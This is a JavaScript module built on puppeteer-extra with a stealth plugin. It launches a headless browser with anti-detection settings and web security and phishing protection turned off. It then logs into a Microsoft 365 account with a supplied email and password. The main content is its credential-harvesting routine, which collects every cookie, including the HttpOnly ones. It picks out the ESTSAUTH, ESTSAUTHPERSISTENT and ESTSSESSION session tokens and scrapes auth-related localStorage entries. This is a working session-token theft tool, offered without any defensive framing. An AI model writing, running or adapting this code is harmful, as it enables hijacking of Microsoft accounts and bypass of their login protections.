const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');

puppeteer.use(StealthPlugin());

async function launchStealthBrowser() {
    console.log('🚀 Launching stealth browser...');
    
    const browser = await puppeteer.launch({
        headless: 'new',
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas',
            '--disable-gpu',
            '--window-size=1920,1080',
            '--disable-web-security',
            '--disable-features=IsolateOrigins,site-per-process',
            '--disable-blink-features=AutomationControlled',
            '--disable-client-side-phishing-detection',
            '--disable-component-update',
            '--disable-default-apps',
            '--disable-extensions',
            '--disable-popup-blocking',
            '--disable-sync',
            '--disable-translate',
            '--metrics-recording-only',
            '--safebrowsing-disable-auto-update',
            '--enable-automation',
            '--password-store=basic',
            '--use-mock-keychain',
            '--disable-infobars',
            '--disable-notifications'
        ],
        ignoreDefaultArgs: ['--enable-automation']
    });
    
    return browser;
}

async function interceptOAuthFlow(browser, email, password) {
    const page = await browser.newPage();
    
    await page.setViewport({ width: 1920, height: 1080 });
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    
    await page.setRequestInterception(true);
    page.on('request', (request) => {
        const headers = request.headers();
        headers['Accept-Language'] = 'en-US,en;q=0.9';
        headers['Accept-Encoding'] = 'gzip, deflate, br';
        request.continue({ headers });
    });
    
    const msLoginUrl = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?' +
        'client_id=4765445b-32c6-49b0-83e6-1d93765276ca&' +
        'redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&' +
        'response_type=code%20id_token&' +
        'scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&' +
        'response_mode=form_post&' +
        'nonce=' + Date.now() + '.ZjU0YmVjYzUtNzMyZi00MzBlLWE1NWYtMjUwOTBmNTNhNjc2NjYzMTY5ZGUtMjI1NC00NzRmLWIyMjItNGM5OGJlMjU3Mjdl&' +
        'ui_locales=en-US&mkt=en-US&' +
        'login_hint=' + encodeURIComponent(email);
    
    await page.goto(msLoginUrl, { waitUntil: 'networkidle2', timeout: 30000 });
    
    try {
        await page.waitForSelector('input[type="email"], input[name="loginfmt"]', { timeout: 10000 });
        const emailInput = await page.$('input[type="email"], input[name="loginfmt"]');
        if (emailInput) {
            await emailInput.click({ clickCount: 3 });
            await emailInput.type(email, { delay: 100 });
            await page.keyboard.press('Enter');
            await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {});
        }
        
        if (password) {
            await page.waitForSelector('input[type="password"], input[name="passwd"]', { timeout: 10000 });
            const passwordInput = await page.$('input[type="password"], input[name="passwd"]');
            if (passwordInput) {
                await passwordInput.click({ clickCount: 3 });
                await passwordInput.type(password, { delay: 80 });
                await page.keyboard.press('Enter');
                await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {});
            }
        }
    } catch (error) {
        console.log('⚠️ Login flow error:', error.message);
    }
    
    const allCookies = await page.cookies();
    const httpOnlyCookies = allCookies.filter(c => c.httpOnly);
    
    const sessionTokens = {
        'x-ms-session': allCookies.find(c => c.name === 'x-ms-session')?.value,
        'id_token': allCookies.find(c => c.name === 'id_token')?.value,
        'ESTSAUTH': allCookies.find(c => c.name === 'ESTSAUTH')?.value,
        'ESTSAUTHPERSISTENT': allCookies.find(c => c.name === 'ESTSAUTHPERSISTENT')?.value,
        'ESTSSESSION': allCookies.find(c => c.name === 'ESTSSESSION')?.value
    };
    
    const localStorageData = await page.evaluate(() => {
        const items = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key && (key.includes('ms') || key.includes('auth') || key.includes('session') || key.includes('token'))) {
                items[key] = localStorage.getItem(key);
            }
        }
        return items;
    });
    
    return {
        cookies: allCookies,
        httpOnlyCookies: httpOnlyCookies,
        sessionTokens: sessionTokens,
        localStorage: localStorageData
    };
}

module.exports = { launchStealthBrowser, interceptOAuthFlow };